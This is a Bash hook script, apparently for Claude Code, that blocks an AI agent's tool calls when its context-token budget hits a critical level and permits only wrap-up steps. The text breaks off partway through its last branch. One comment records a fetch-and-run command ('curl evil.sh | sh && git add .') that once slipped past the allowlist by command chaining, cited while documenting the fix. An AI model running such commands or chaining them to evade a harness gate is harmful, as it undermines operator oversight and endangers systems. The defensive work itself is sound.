#!/bin/bash
# Budget Gate — PreToolUse hook that enforces context budget limits
# BLOCKS tool execution (exit 2) when context tokens exceed critical threshold.
#
# Exit codes (Claude Code PreToolUse semantics):
#   0 — Allow tool execution
#   2 — Block tool execution (stderr shown to agent)
#
# Architecture (T-138 hybrid):
#   - This hook is PRIMARY enforcement (PreToolUse = before execution)
#   - PostToolUse checkpoint.sh is FALLBACK (warnings + auto-handover)
#   - Optional cron job can write .budget-status externally (future)
#
# Performance target: <100ms per invocation
#   - Fast path: read .budget-status if fresh (<90s) — single Python call
#   - Slow path: read JSONL transcript — ~30ms (every 5th call)
#
# Part of: Agentic Engineering Framework (P-009: Context Budget Enforcement)
# (T-2403: writes .restart-requested on the critical-block path — see _write_restart_signal)

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FRAMEWORK_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
source "$FRAMEWORK_ROOT/lib/paths.sh"
source "$FRAMEWORK_ROOT/lib/config.sh"
fw_hook_crash_trap "budget-gate"
STATUS_FILE="$CONTEXT_DIR/working/.budget-status"
GATE_COUNTER_FILE="$CONTEXT_DIR/working/.budget-gate-counter"

# T-2403: write the restart signal on the critical-BLOCK path so autonomous
# continuous mode actually arms. Previously the signal was written ONLY by
# checkpoint.sh (PostToolUse) inside its handover-success block — a path that is
# shut off at critical: general tools are blocked here (exit 2) → their
# PostToolUse never fires → checkpoint never writes the signal → the terminator
# waits forever → the loop dead-locks at link 1 and the iteration never advances.
# budget-gate is the PreToolUse hook that RELIABLY fires at critical (it is the
# thing detecting + blocking), so emitting the signal here decouples it from the
# blocked PostToolUse/handover path. The handover is NOT this hook's job — but it
# is no longer optional either. T-3918 (G-110): the earlier note here said a
# missing handover only "degrades context quality" because `claude -c` preserves
# the conversation; T-3166 made fresh restarts the default, so a restart with no
# handover resumed from a stale LATEST.md (ring20-manager, 13 h). The claude-fw
# terminator now ensures a handover at least as new as this signal (bounded) before
# it ends the session, and logs the outcome to .compact-log.
#
# JSON shape matches checkpoint.sh:210-212 (timestamp, session_id, reason,
# tokens, optional directive fold from .next-directive.yaml) so claude-fw and
# post-compact-resume consume it identically. The whole body is wrapped so it can
# NEVER break the gate — this hook gates EVERY tool call, and a non-zero/partial
# failure here would block all tools. Called only on the BLOCK path (after the
# `allowed` check), never on the allowed path, so a restart can't fire while the
# agent is still wrapping up (mid-commit / mid-handover). Idempotent: budget-gate
# runs on every call, so the write may repeat while at critical — each repeat
# just refreshes the timestamp of an already-valid signal (the terminator acts on
# first detection, so churn is harmless).
_write_restart_signal() {
    local tokens="${1:-0}"
    {
        local restart_signal="$CONTEXT_DIR/working/.restart-requested"
        local session_id=""
        if [ -f "$CONTEXT_DIR/working/session.yaml" ]; then
            session_id=$(grep "^session_id:" "$CONTEXT_DIR/working/session.yaml" 2>/dev/null | cut -d: -f2 | tr -d ' ') || true
        fi
        # T-2363 directive fold (parity with checkpoint.sh): include the
        # .next-directive.yaml `directive:` value so the resumed session can pick
        # it up. Absent file → JSON shape unchanged (backward-compat).
        local _directive_file="$CONTEXT_DIR/working/.next-directive.yaml"
        local _directive_json=""
        if [ -f "$_directive_file" ]; then
            _directive_json=$(python3 -c "
import yaml, json
try:
    with open('$_directive_file') as f:
        d = yaml.safe_load(f) or {}
    v = d.get('directive')
    if isinstance(v, str) and v.strip():
        print(',\"directive\":' + json.dumps(v.strip()))
except Exception:
    pass
" 2>/dev/null) || _directive_json=""
        fi
        cat > "$restart_signal" << SIGNAL_EOF
{"timestamp":"$(date -u +%Y-%m-%dT%H:%M:%SZ)","session_id":"${session_id:-unknown}","reason":"critical_budget_gate_block","tokens":${tokens:-0}${_directive_json}}
SIGNAL_EOF
    } 2>/dev/null || true
}

# T-3989 (1409): start the critical auto-handover from HERE. It lived only in the
# PostToolUse checkpoint.sh, and PostToolUse never runs on a call this hook blocked, so
# at critical no handover was ever written and the session was cut off instead (1409:
# 4 of 5 large sessions, work recovered by hand). Detached, so a 60 s handover cannot
# hang the hook; checkpoint.sh's own lock + cooldown make repeat calls a no-op.
# FW_CHECKPOINT_SH overrides the script started: test suites that exercise the critical
# path set FW_CHECKPOINT_SH=/bin/true, or every blocked case starts a real handover
# (ring20-dashboard: 40 cases 110 s -> 6.7 s, T-4006; docs/context-compaction.md).
_start_auto_handover() {
    local tokens="${1:-0}"
    {
        ( cd "${PROJECT_ROOT:-.}" && setsid nohup bash "${FW_CHECKPOINT_SH:-$SCRIPT_DIR/checkpoint.sh}" auto-handover "$tokens" \
            >>"$CONTEXT_DIR/working/.checkpoint.handover.stderr" 2>&1 </dev/null & ) >/dev/null 2>&1
    } 2>/dev/null || true
    echo "  AUTO-HANDOVER: started in the background (log: .context/working/.compact-log). Do not start another." >&2
}

# T-2499: the budget-critical auto-restart loop only fires when the session is
# supervised by claude-fw (it consumes the .restart-requested signal this gate
# writes). A plain `claude` launch leaves FW_CLAUDE_FW_SUPERVISED unset → the
# signal is written into the void and the session silently overruns (the 300K→
# 350K bug). This makes that state LOUD at every warn/urgent/critical surface so
# it can never silently disarm the loop again. Emits nothing when supervised.
_supervision_notice() {
    # Agent-facing status line + a suggestion to relay to the operator: only a
    # human can type 'claude-fw' or '/compact' (T-2143 audience axis) — the
    # agent cannot invoke either as a tool call, so pass it along in prose.
    if [ "${FW_CLAUDE_FW_SUPERVISED:-0}" != "1" ]; then
        echo "  ⚠ Unsupervised session (not under claude-fw): the budget auto-restart loop will NOT fire." >&2
        echo "    Tell the operator: relaunch via 'claude-fw' for hands-off recovery, or run '/compact' before critical (see docs/context-compaction.md)." >&2
    fi
}

# T-4005: when the python3 call below yields nothing usable (python3 died, or
# crashed before printing), the gate used to fall through to exit 0 even with a
# cached level of critical. This runs without python: it reads the cached level
# with grep, and at critical it classifies the call with shell tools only. It
# errs toward BLOCK: any shell metacharacter, backslash escape or '..' path is
# refused, so only the plain wrap-up spellings get through. Not critical: returns
# and the gate continues exactly as before.
_budget_json_field() {
    local key="$1" v
    v=$(printf '%s' "$INPUT" | tr '\n' ' ' | grep -oE "\"$key\"[[:space:]]*:[[:space:]]*\"([^\"\\\\]|\\\\.)*\"" | head -1) || true
    v=${v#*:}; v=${v#*\"}; v=${v%\"}
    printf '%s' "${v//\\\"/\"}"
}
_budget_cmd_wrapup() {
    case "$1" in *\\*|*\;*|*\&*|*\|*|*\`*|*\$*|*\<*|*\>*) return 1 ;; esac
    printf '%s' "$1" | grep -qE '^[[:space:]]*(git[[:space:]]+(commit|add|push)|([[:alnum:]_./-]*/)?fw[[:space:]]+(handover|context[[:space:]]+focus))([[:space:]]|$)'
}
_budget_path_wrapup() {
    case "$1" in ""|*..*) return 1 ;; *.context/*|*.tasks/*|*.claude/*) return 0 ;; esac
    return 1
}
_budget_parser_dead_gate() {
    local cached tokens tool cmd fp allowed=0
    cached=""
    if [ -f "$STATUS_FILE" ]; then
        cached=$(grep -o '"level"[[:space:]]*:[[:space:]]*"[a-z]*"' "$STATUS_FILE" 2>/dev/null | head -1 | sed 's/.*"\([a-z]*\)"$/\1/') || true
    fi
    [ "$cached" = "critical" ] || return 0
    tokens=$(grep -o '"tokens"[[:space:]]*:[[:space:]]*[0-9]*' "$STATUS_FILE" 2>/dev/null | head -1 | grep -o '[0-9]*$') || true
    case "$tokens" in ''|*[!0-9]*) tokens=0 ;; esac
    tool=$(_budget_json_field tool_name)
    case "$tool" in
        Read|Glob|Grep) allowed=1 ;;
        Bash) cmd=$(_budget_json_field command); _budget_cmd_wrapup "$cmd" && allowed=1 ;;
        Write|Edit) fp=$(_budget_json_field file_path); _budget_path_wrapup "$fp" && allowed=1 ;;
    esac
    [ "$allowed" -eq 1 ] && exit 0
    echo "" >&2
    echo "══════════════════════════════════════════════════════════" >&2
    echo "  BUDGET PARSER FAILED (python3 produced no reading)" >&2
    echo "══════════════════════════════════════════════════════════" >&2
    echo "" >&2
    echo "  Cached budget level is critical (~${tokens} tokens). The gate cannot re-measure" >&2
    echo "  the transcript without python3, so it trusts the last reading and blocks new work." >&2
    echo "" >&2
    echo "  ALLOWED: git commit/add/push, $(_fw_cmd) handover, $(_fw_cmd) context focus," >&2
    echo "           Read/Glob/Grep, Write/Edit to .context/ .tasks/ .claude/" >&2
    echo "  BLOCKED: everything else (this call: ${tool:-unknown tool})" >&2
    echo "" >&2
    echo "  Action: restore python3 (python3 -c 'print(1)'), commit your work, then run '$(_fw_cmd) handover'" >&2
    echo "══════════════════════════════════════════════════════════" >&2
    echo "" >&2
    _start_auto_handover "$tokens"
    _write_restart_signal "$tokens"
    exit 2
}

# CONFIGURED BUDGET CAP — not a measurement of the model's context window.
# A deliberate quality-and-cost dial, override via FW_CONTEXT_WINDOW / fw config set
# CONTEXT_WINDOW. Every percentage derived from it is a percentage OF THIS CAP, and
# the reader-facing messages say so (T-3204) — "~95% of context window" read as a
# hard limit approaching, when it is a policy dial at its configured value, and the
# two license opposite actions.
CONTEXT_WINDOW=$(fw_config_int "CONTEXT_WINDOW" 300000)

# Token thresholds (autoCompact disabled — D-027)
TOKEN_WARN=$((CONTEXT_WINDOW * 75 / 100))        # ~75% (225K at 300K)
TOKEN_URGENT=$((CONTEXT_WINDOW * 85 / 100))      # ~85% (255K at 300K)
TOKEN_CRITICAL=$((CONTEXT_WINDOW * 95 / 100))    # ~95% (285K at 300K)

# How often to re-read the transcript (every Nth tool call)
RECHECK_INTERVAL=$(fw_config_int "BUDGET_RECHECK_INTERVAL" 5)

# Max age of .budget-status before considering it stale (seconds)
STATUS_MAX_AGE=$(fw_config_int "BUDGET_STATUS_MAX_AGE" 90)

# Read stdin (JSON from Claude Code)
INPUT=$(cat)

# --- Single Python call: extract tool info + read status + decide ---
# Combines tool_name extraction, status file reading, and command extraction
# into one Python invocation to minimize startup overhead (~60ms vs ~120ms).
RESULT=$(echo "$INPUT" | python3 -c "
import sys, json, time, os

# Parse stdin (tool call JSON)
try:
    data = json.load(sys.stdin)
except:
    data = {}

import re
tool_name = data.get('tool_name', '')
command = data.get('tool_input', {}).get('command', '')

# T-3598: the CLAUDE session making this call. Every Claude process in the
# project (parent + TermLink workers) writes the same cache, and the framework
# session_id in it comes from session.yaml, which they all share, so only the
# Claude session id can tell them apart. Stdin session_id first, else the
# transcript file stem (Claude Code names transcripts by session id).
caller_sid = data.get('session_id') or ''
if not caller_sid:
    _tp = data.get('transcript_path') or ''
    if _tp:
        caller_sid = os.path.splitext(os.path.basename(_tp))[0]
caller_sid = re.sub(r'[^A-Za-z0-9._-]', '', caller_sid)

# Read cached status file
status_file = '$STATUS_FILE'
level = 'unknown'
tokens = 0
age = 999
owner = 'mine'

if os.path.exists(status_file):
    try:
        with open(status_file) as f:
            s = json.load(f)
        level = s.get('level', 'unknown')
        tokens = s.get('tokens', 0)
        age = int(time.time()) - s.get('timestamp', 0)
        # T-3598: a cache stamped by another Claude session is not this
        # session's budget. Legacy caches (no claude_session_id) and callers
        # with no identity keep the old age-only behaviour.
        cache_sid = s.get('claude_session_id') or ''
        if cache_sid and caller_sid and cache_sid != caller_sid:
            owner = 'foreign'
    except:
        pass

# Output: LEVEL TOKENS AGE TOOL_NAME CLASSIFICATION
# Classification: 'allowed' for wrap-up/read ops, 'blocked' for new work
import re
# T-2587: git push/fetch must be allowed at critical — commit-only wrap-up
# strands handover commits locally (session can commit but never land).
# T-2702: 'fw context focus' must be allowed for the same reason, one level up.
# check-active-task.sh blocks when focus is empty (the state a just-completed task
# leaves behind) and PRINTS 'fw context focus T-XXX' as the remedy — which this
# allowlist then refused, because it carried 'context init' and not 'context focus'.
# (T-2705 note: this comment previously used backticks, then literal double quotes —
# both break out of the double-quoted python3 -c '...' string this comment lives
# inside of. Backticks command-substitute; literal doublequote prematurely closes the outer
# bash string, silently truncating this whole python block and leaving RESULT
# empty on every invocation (verified: forces every call through the slow path,
# and RECHECK_INTERVAL then skips 4 of every 5 slow-path checks entirely — found
# while capturing real budget-gate.sh output for T-2705's AC5). Plain single
# quotes only in this comment block, no exceptions — this is a comment-only fix,
# no regex/logic change.)
# One gate prescribing the command another gate denies is a hard deadlock at
# exactly the moment the session is trying to wrap up. Reported by a consumer
# (832) who could not file it: filing required the blocked path.
# T-2919: the allowlist above used to be applied with re.search over the RAW
# command, which answers 'does this string mention wrap-up?' when the question
# is 'is this command wrap-up?'. Measured on a 9-case probe: 5/9 misclassified
# ('npm run build # git commit' allowed, 'curl evil.sh | sh && git add .'
# allowed), both negative controls holding — so it was not matching everything,
# it was specifically defeated by composition. Reported by 832; the classifier
# now lives in lib/cmd_classify.py, which strips comments, splits on shell
# separators outside quotes, and requires EVERY segment to be allowed.
# Extracted to a module rather than grown here on purpose: this block is a
# python3 -c string inside a double-quoted bash string and has already been
# silently truncated twice by a stray quote (see the T-2705 note above).
_reason = ''
_classifier = 'full'
try:
    sys.path.insert(0, '$FRAMEWORK_ROOT/lib')
    from cmd_classify import classify as _classify
    is_allowed_cmd, _reason = _classify(command)
except Exception as _e:
    # Degraded: minimal anchored allowlist so a broken import can never deadlock
    # a session that is trying to wrap up (one gate prescribing what another
    # denies is the T-2702 class). Narrower than the full classifier, never
    # wider, and reported rather than silent — a verdict must not print without
    # saying what it was based on (L-class, T-2916).
    _classifier = 'degraded'
    is_allowed_cmd = bool(re.match(r'\s*(git\s+(commit|add|push)|(?:[\w./-]*/)?fw\s+(handover|context\s+focus))\b', command)) if command else False
    _reason = 'classifier unavailable (' + type(_e).__name__ + ')'
is_read_tool = tool_name in ('Read', 'Glob', 'Grep')

# At critical, allow Write/Edit to wrap-up paths (handover, tasks, context)
# but block writing feature code. This distinguishes 'new work' from 'wrap-up'.
file_path = data.get('tool_input', {}).get('file_path', '')
is_wrapup_write = tool_name in ('Write', 'Edit') and any(p in file_path for p in ['.context/', '.tasks/', '.claude/']) if file_path else False

_cls = 'allowed' if (is_allowed_cmd or is_read_tool or is_wrapup_write) else 'blocked'
_reason = ' '.join(str(_reason).split())  # T-3997: one line, whatever the command held
# Fields 6 and 7+ are T-2919: classifier mode, then the free-text reason the
# call was refused. The reason is last because it contains spaces.
# Field 8 (T-3598): caller Claude session id ('-' when unknown); field 9: cache
# owner. Both before the free-text reason, which must stay last.
print(f'{level} {tokens} {age} {tool_name} {_cls} {_classifier} {caller_sid or \"-\"} {owner} {_reason}')
" 2>/dev/null)

# Parse result
# T-3997 (1409, root cause of T-3989 finding 5): the free-text reason is the last field and
# can carry the refused command's own newlines; awk then printed field 3 of EVERY line and
# STATUS_AGE became "42\nimport ...". Parse the first line only.
RESULT="${RESULT%%$'\n'*}"
STATUS_LEVEL=$(echo "$RESULT" | awk '{print $1}')
STATUS_TOKENS=$(echo "$RESULT" | awk '{print $2}')
STATUS_AGE=$(echo "$RESULT" | awk '{print $3}')
# shellcheck disable=SC2034 # TOOL_NAME available for debug logging
TOOL_NAME=$(echo "$RESULT" | awk '{print $4}')
CMD_CLASS=$(echo "$RESULT" | awk '{print $5}')
# T-2919: classifier mode + why the call was refused, so the block message can
# name the offending segment instead of just saying no.
CMD_CLASSIFIER=$(echo "$RESULT" | awk '{print $6}')
# T-3598: which Claude session is calling, and whether the cache is its own.
CALLER_SID=$(echo "$RESULT" | awk '{print $7}')
[ "$CALLER_SID" = "-" ] && CALLER_SID=""
CACHE_OWNER=$(echo "$RESULT" | awk '{print $8}')
CMD_REASON=$(echo "$RESULT" | cut -d' ' -f9-)

# T-4005: no usable reading from python3 (empty RESULT, or a level outside the
# known set) — decide from the cached level without python.
case "$STATUS_LEVEL" in ok|warn|urgent|critical|unknown) _BUDGET_PY_OK=1 ;; *) _BUDGET_PY_OK=0 ;; esac
[ -n "$RESULT" ] || _BUDGET_PY_OK=0
if [ "$_BUDGET_PY_OK" -eq 0 ]; then
    _budget_parser_dead_gate
fi

# Default to safe values if Python failed
STATUS_LEVEL=${STATUS_LEVEL:-unknown}
STATUS_TOKENS=${STATUS_TOKENS:-0}
STATUS_AGE=${STATUS_AGE:-999}
CMD_CLASS=${CMD_CLASS:-blocked}
CMD_CLASSIFIER=${CMD_CLASSIFIER:-unknown}
# T-3989 (1409, finding 5): the numeric fields go straight into [ -lt ] tests. 1409
# logged "[: 7 | sys.path.insert(0,...): integer expression expected" 18x in one session (first reported as 74x; corrected by 1409, T-4004):
# a non-integer here broke the fast path silently. Validate; a bad value takes the slow
# path (age 999) and says so once on stderr instead of failing every test.
case "$STATUS_AGE" in ''|*[!0-9]*)
    echo "budget-gate: ignoring non-numeric cache age '${STATUS_AGE:0:40}' — re-reading the transcript (T-3989)" >&2
    STATUS_AGE=999 ;;
esac
case "$STATUS_TOKENS" in ''|*[!0-9]*) STATUS_TOKENS=0; STATUS_AGE=999 ;; esac

# T-2919: surface the basis of the verdict at critical, on BOTH the allow and
# the block path. A degraded classifier reaches the same two words as a working
# one; that indistinguishability is the defect class this fix came from.
_classifier_notice() {
    if [ "$CMD_CLASSIFIER" = "degraded" ] || [ "$CMD_CLASSIFIER" = "unknown" ]; then
        echo "  NOTE: command classifier ${CMD_CLASSIFIER} (lib/cmd_classify.py) — minimal allowlist in effect." >&2
    fi
}

# --- Fast path: use cached status if fresh ---
# Only use cached status when fresh (< STATUS_MAX_AGE seconds).
# T-271 fix: stale critical falls through to slow path for re-validation.
# Previous Bug 3 fix blindly trusted stale critical, creating a trap where
# the slow path (which re-reads the actual transcript) could never run after
# compaction or session restart, permanently blocking the agent.
# T-3598: ...and only when this Claude session wrote it. A foreign cache (the
# parent's, or a TermLink worker's) is skipped here and forces a re-read of the
# caller's own transcript below, so neither session acts on the other's number.
if [ "$CACHE_OWNER" != "foreign" ] && [ "${STATUS_AGE}" -lt "$STATUS_MAX_AGE" ]; then
    case "$STATUS_LEVEL" in
        ok)
            exit 0
            ;;
        warn)
            echo "Note: Context at ~${STATUS_TOKENS} tokens (~$((STATUS_TOKENS * 100 / CONTEXT_WINDOW))% of the ${CONTEXT_WINDOW}-token budget cap). Commit before starting new work. (docs/context-compaction.md)" >&2
            _supervision_notice
            exit 0
            ;;
        urgent)
            echo "WARNING: Context at ~${STATUS_TOKENS} tokens (~$((STATUS_TOKENS * 100 / CONTEXT_WINDOW))% of the ${CONTEXT_WINDOW}-token budget cap). Do not start new work. Commit and handover." >&2
            echo "  Details: docs/context-compaction.md (budget ladder, what to do at each level)" >&2
            _supervision_notice
            exit 0
            ;;
        critical)
            _classifier_notice
            if [ "$CMD_CLASS" = "allowed" ]; then
                exit 0
            fi
            echo "" >&2
            echo "══════════════════════════════════════════════════════════" >&2
            echo "  SESSION WRAPPING UP (~${STATUS_TOKENS} tokens)" >&2
            echo "══════════════════════════════════════════════════════════" >&2
            echo "" >&2
            echo "  Context is at ~$((STATUS_TOKENS * 100 / CONTEXT_WINDOW))% of the ${CONTEXT_WINDOW}-token budget cap." >&2
            echo "  Task files already have all essential state. Time to wrap up." >&2
            echo "" >&2
            echo "  ALLOWED: git commit/push, $(_fw_cmd) handover, reading files," >&2
            echo "           Write/Edit to .context/ .tasks/ .claude/" >&2
            echo "  BLOCKED: Write/Edit to source files, Bash (except commit/push/handover)" >&2
            if [ -n "${CMD_REASON// /}" ]; then
                echo "" >&2
                echo "  THIS CALL: ${CMD_REASON}" >&2
                echo "  A chain is allowed only if EVERY segment is — restructure, do not merge." >&2
            fi
            echo "" >&2
            echo "  Action: Commit your work, then run '$(_fw_cmd) handover'" >&2
            echo "  Under claude-fw the session ends when THIS turn ends (T-4032): wrap up now," >&2
            echo "  in this turn. A handover is written for you if you do not write one." >&2
            echo "  (Exception: a turn still running after 15 min, or a project whose Stop hooks are not wired, is ended at that ceiling.)" >&2
            echo "  Details: docs/context-compaction.md (budget ladder, what handover/compact capture)" >&2
            _supervision_notice
            echo "══════════════════════════════════════════════════════════" >&2
            echo "" >&2
            _start_auto_handover "$STATUS_TOKENS"    # T-3989: PostToolUse never runs on a blocked call
            _write_restart_signal "$STATUS_TOKENS"   # T-2403: arm autonomous restart
            exit 2
            ;;
    esac
fi

# --- Slow path: re-read transcript every Nth call ---
# T-271: Force immediate re-read when stale critical is detected.
# This prevents the stale-critical trap while still re-validating from
# the actual transcript before deciding to block.
FORCE_RECHECK=0
if [ "$STATUS_LEVEL" = "critical" ] && [ "${STATUS_AGE}" -ge "$STATUS_MAX_AGE" ]; then
    FORCE_RECHECK=1
fi
# T-3598: a foreign cache says nothing about this session, and the recheck
# counter is shared too — skipping here would let 4 of 5 calls through unmeasured.
if [ "$CACHE_OWNER" = "foreign" ]; then
    FORCE_RECHECK=1
fi

mkdir -p "$(dirname "$GATE_COUNTER_FILE")"
GATE_COUNT=0
if [ -f "$GATE_COUNTER_FILE" ]; then
    GATE_COUNT=$(tr -d '[:space:]' < "$GATE_COUNTER_FILE" 2>/dev/null) || GATE_COUNT=0
fi
GATE_COUNT=$((GATE_COUNT + 1))
echo "$GATE_COUNT" > "$GATE_COUNTER_FILE"

# Only re-read transcript every Nth call (performance), UNLESS force re-check
if [ "$FORCE_RECHECK" -ne 1 ] && [ $((GATE_COUNT % RECHECK_INTERVAL)) -ne 1 ] && [ "$GATE_COUNT" -ne 1 ]; then
    exit 0
fi

# Find transcript.
# T-2377: prefer the authoritative transcript_path Claude Code passes on stdin
# ($INPUT, captured above). Reconstructing from PROJECT_ROOT is WRONG in git
# worktrees / background jobs — Claude Code keys the transcript dir on the
# session's LAUNCH cwd (the main repo), not the worktree's PROJECT_ROOT, so the
# gate searched an empty/stale sibling dir and never saw the live token count
# (the loop never armed). Reconstruction (T-2375 encoding + T-791 scoping) is the
# fallback when stdin carries no usable path (e.g. manual invocation).
TRANSCRIPT=$(printf '%s' "$INPUT" | python3 -c "
import sys, json, os
try:
    p = json.load(sys.stdin).get('transcript_path') or ''
except Exception:
    p = ''
print(p if (p and os.path.isfile(p)) else '')
" 2>/dev/null) || TRANSCRIPT=""

if [ -z "${TRANSCRIPT:-}" ]; then
    # Fallback: reconstruct (no stdin transcript_path available).
    # Claude Code encodes project paths by replacing every non-alnum char with '-'
    # (e.g. /opt/foo → -opt-foo; /opt/x/.claude/worktrees/y → -opt-x--claude-worktrees-y).
    # T-2392: search ALL candidate project dirs — the PROJECT_ROOT-keyed dir AND
    # the primary-worktree (main-repo) dir Claude Code launched from — and pick the
    # GLOBALLY-newest transcript. PROJECT_ROOT alone is blind in worktree sessions.
    TRANSCRIPT=$(
        while IFS= read -r d; do
            find "$d" -maxdepth 1 -name "*.jsonl" -type f ! -name "agent-*" -print0 2>/dev/null
        done < <(fw_claude_project_dirs) | xargs -r -0 ls -t 2>/dev/null | head -1
    )
fi

if [ -z "${TRANSCRIPT:-}" ]; then
    # T-3241: previously exited silently, leaving whatever cache already existed
    # in place — a stale "ok" from an earlier, real reading sits there
    # indefinitely with nothing marking it untrustworthy. Write an honest
    # "unknown" instead. Fails open exactly as before (no case arm matches
    # "unknown"); only the on-disk claim changes.
    NT_SESSION_ID=""
    if [ -f "$CONTEXT_DIR/working/session.yaml" ]; then
        NT_SESSION_ID=$(grep "^session_id:" "$CONTEXT_DIR/working/session.yaml" 2>/dev/null | cut -d: -f2 | tr -d ' ') || true
    fi
    printf '{"level": "unknown", "tokens": null, "timestamp": %d, "session_id": "%s", "claude_session_id": "%s", "source": "budget-gate", "note": "no transcript found", "baseline_tokens": null, "headroom_tokens": null, "headroom_ratio": null}' \
        "$(date +%s)" "${NT_SESSION_ID:-unknown}" "$CALLER_SID" > "$STATUS_FILE" 2>/dev/null || true
    exit 0
fi

# Read tokens via the shared scan (T-2885, lib/context_tokens.py) — scopes
# entries to the dominant model since the last compact_boundary rather than
# trusting the newest raw entry, so a foreign-model cache-priming call can no
# longer poison this conversation's reading (832 T-401).
# T-1088: pass .session-start-ts so pre-compact entries from the same JSONL
# (claude -c continues the same file) are excluded.
SESSION_START_TS=""
TS_FILE="$CONTEXT_DIR/working/.session-start-ts"
if [ -f "$TS_FILE" ]; then
    SESSION_START_TS=$(tr -d '[:space:]' < "$TS_FILE" 2>/dev/null) || SESSION_START_TS=""
fi
# T-3241 (folds in field report 001-CashWeb T-222/G-087): --with-model surfaces
# the "was this confidently measured" signal context_tokens.py already computes
# internally (an empty model = give-up, whether from too-few-in-scope-entries,
# no entries at all, or an uncaught scan crash e.g. UnicodeDecodeError on invalid
# UTF-8 during transcript line iteration) but which the bare-integer form this
# used to call collapses into an indistinguishable "0". Pre-fix, the regex
# fallback `[[ "$TOKENS" =~ ^[0-9]+$ ]] || TOKENS=0` fed a crash/give-up AND a
# genuine zero-usage session into the same branch below, producing
# {"level":"ok","tokens":0} in both cases — byte-identical to every reader.
# SCAN_OK preserves the distinction that fallback erased.
SCAN_RESULT=$(tail -c 10000000 "$TRANSCRIPT" 2>/dev/null | python3 "$FRAMEWORK_ROOT/lib/context_tokens.py" "$SESSION_START_TS" --with-model 2>/dev/null)
RAW_TOKENS=$(printf '%s' "$SCAN_RESULT" | cut -f1)
RAW_MODEL=$(printf '%s' "$SCAN_RESULT" | cut -sf2)
if [[ "$RAW_TOKENS" =~ ^[0-9]+$ ]] && [ -n "$RAW_MODEL" ]; then
    TOKENS="$RAW_TOKENS"
    SCAN_OK=1
else
    TOKENS=0
    SCAN_OK=0
fi

# T-3241: the cache now carries its own writer identity so a reader can
# mechanically tell "this number is not from my session" instead of trusting a
# plausible-looking but foreign or stale value.
BG_SESSION_ID=""
if [ -f "$CONTEXT_DIR/working/session.yaml" ]; then
    BG_SESSION_ID=$(grep "^session_id:" "$CONTEXT_DIR/working/session.yaml" 2>/dev/null | cut -d: -f2 | tr -d ' ') || true
fi

if [ "$SCAN_OK" -eq 1 ]; then
    LEVEL="ok"
    if [ "$TOKENS" -ge "$TOKEN_CRITICAL" ]; then
        LEVEL="critical"
    elif [ "$TOKENS" -ge "$TOKEN_URGENT" ]; then
        LEVEL="urgent"
    elif [ "$TOKENS" -ge "$TOKEN_WARN" ]; then
        LEVEL="warn"
    fi
    # T-3248: useful-headroom fields ride along in the same cache write, so the
    # loop can read WINDOW - BASELINE from the file it already reads. BASELINE
    # is measured from this session's OWN transcript (first in-scope usage entry
    # — checkpoint.sh get_baseline_tokens; full scan once, then served from the
    # .session-baseline cache, so this subprocess is cheap on repeat calls).
    # Measurement only: nothing below gates, warns, or blocks on these fields —
    # if a threshold is ever warranted it is a separate task, argued from the
    # observed distribution (T-3248 AC 5). Nulls when the baseline is not yet
    # measurable — never a fabricated number (same honesty rule as T-3241).
    BASELINE=$(bash "$SCRIPT_DIR/checkpoint.sh" baseline "$TRANSCRIPT" 2>/dev/null) || BASELINE=0
    [[ "$BASELINE" =~ ^[0-9]+$ ]] || BASELINE=0
    if [ "$BASELINE" -gt 0 ]; then
        HEADROOM=$((CONTEXT_WINDOW - BASELINE))
        HEADROOM_RATIO=$(awk -v h="$HEADROOM" -v w="$CONTEXT_WINDOW" 'BEGIN{printf "%.2f", h/w}')
        HR_JSON=", \"baseline_tokens\": ${BASELINE}, \"headroom_tokens\": ${HEADROOM}, \"headroom_ratio\": ${HEADROOM_RATIO}"
    else
        HR_JSON=', "baseline_tokens": null, "headroom_tokens": null, "headroom_ratio": null'
    fi
    # Write status file (fast-path cache for subsequent gate calls)
    printf '{"level": "%s", "tokens": %d, "timestamp": %d, "session_id": "%s", "claude_session_id": "%s", "source": "budget-gate"%s}' \
        "$LEVEL" "$TOKENS" "$(date +%s)" "${BG_SESSION_ID:-unknown}" "$CALLER_SID" "$HR_JSON" > "$STATUS_FILE" 2>/dev/null || true
else
    # T-3241: scan failed (unreadable/unparseable transcript, or too few in-scope
    # entries to trust a scope decision — context_tokens.py's own "return 0 rather
    # than guess" path) — write "unknown", never a fabricated "ok". No case arm
    # below matches "unknown", so this call still fails open (same as the
    # pre-existing no-transcript path) — only the ON-DISK claim changes, not gate
    # enforcement.
    LEVEL="unknown"
    printf '{"level": "unknown", "tokens": null, "timestamp": %d, "session_id": "%s", "claude_session_id": "%s", "source": "budget-gate", "note": "scan failed or produced no data", "baseline_tokens": null, "headroom_tokens": null, "headroom_ratio": null}' \
        "$(date +%s)" "${BG_SESSION_ID:-unknown}" "$CALLER_SID" > "$STATUS_FILE" 2>/dev/null || true
fi
LEVEL=${LEVEL:-ok}
TOKENS=${TOKENS:-0}

case "$LEVEL" in
    ok)
        exit 0
        ;;
    warn)
        echo "Note: Context at ${TOKENS} tokens (~$((TOKENS * 100 / CONTEXT_WINDOW))% of the ${CONTEXT_WINDOW}-token budget cap). Commit before starting new work. (docs/context-compaction.md)" >&2
        _supervision_notice
        exit 0
        ;;
    urgent)
        echo "WARNING: Context at ${TOKENS} tokens (~$((TOKENS * 100 / CONTEXT_WINDOW))% of the ${CONTEXT_WINDOW}-token budget cap). Do not start new work. Commit and handover." >&2
        echo "  Details: docs/context-compaction.md (budget ladder, what to do at each level)" >&2
        _supervision_notice
        exit 0
        ;;
    critical)
        _classifier_notice
        if [ "$CMD_CLASS" = "allowed" ]; then
            exit 0
        fi
        echo "" >&2
        echo "══════════════════════════════════════════════════════════" >&2
        echo "  SESSION WRAPPING UP (${TOKENS} tokens)" >&2
        echo "══════════════════════════════════════════════════════════" >&2
        echo "" >&2
        echo "  Context is at ~$((TOKENS * 100 / CONTEXT_WINDOW))% of the ${CONTEXT_WINDOW}-token budget cap." >&2
        echo "  Task files already have all essential state. Time to wrap up." >&2
        echo "" >&2
        echo "  ALLOWED: git commit/push, $(_fw_cmd) handover, reading files," >&2
        echo "           Write/Edit to .context/ .tasks/ .claude/" >&2
        echo "  BLOCKED: Write/Edit to source files, Bash (except commit/push/handover)" >&2
        if [ -n "${CMD_REASON// /}" ]; then
            echo "" >&2
            echo "  THIS CALL: ${CMD_REASON}" >&2
            echo "  A chain is allowed only if EVERY segment is — restructure, do not merge." >&2
        fi
